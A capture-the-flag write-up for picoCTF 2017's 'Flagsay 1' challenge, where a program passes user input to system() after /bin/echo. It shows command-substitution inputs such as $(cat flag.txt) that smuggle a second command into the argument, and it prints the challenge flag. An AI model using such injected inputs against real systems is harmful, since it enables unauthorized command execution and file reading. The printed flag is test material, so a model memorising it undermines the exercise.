**Challenge name:** Flagsay 1      
**Description:** I heard you like flags, so now you can make your own! Exhilarating! Use flagsay-1! Source. Connect on shell2017.picoctf.com:37742.    
**Hint:** System will run exactly what the program gives it      
**File(s) provided:**      
- flagsay-1 (32-bit ELF)  
- flagsay-1.c (source code)  
---

# Step 0: Recon
Looking at the code, we can see that the program:  
- reads input (lines 53-56)
- adds a null terminator at the first ```\n``` (lines 57-60)
- passes the input to the ```placeInFlag``` function, which puts the input inside the flag ASCII art (line 61)
- adds ```/bin/echo ``` at the start of the output and passes it to system

Really?! Never pass user input to system commands without serious input validation, kids. And use whitelisting if you do.

# Step 1: Confirming command injection
```bash
# ./flagsay-1
$(python -c "print 1+1")
               _                                        
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
             //2           /     
            //                                   /      
           //                                   /       
          //                                   /        
         //                                   /         
        //                                   /          
       //___________________________________/           
      //                                                
     //                                                 
    //                                                  
   //                                                   
  //                                                    
 //  
```
Oh yeah, we've got system command execution.
 
# Step 2: Get flag
```bash
# nc shell2017.picoctf.com 37742
$(cat flag.txt)
               _                                        
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
             //697f4b6f43dc04baf91a01c7823f2412                    /     
            //                                   /      
           //                                   /       
          //                                   /        
         //                                   /         
        //                                   /          
       //___________________________________/           
      //                                                
     //                                                 
    //                                                  
   //                                                   
  //                                                    
 //  
```
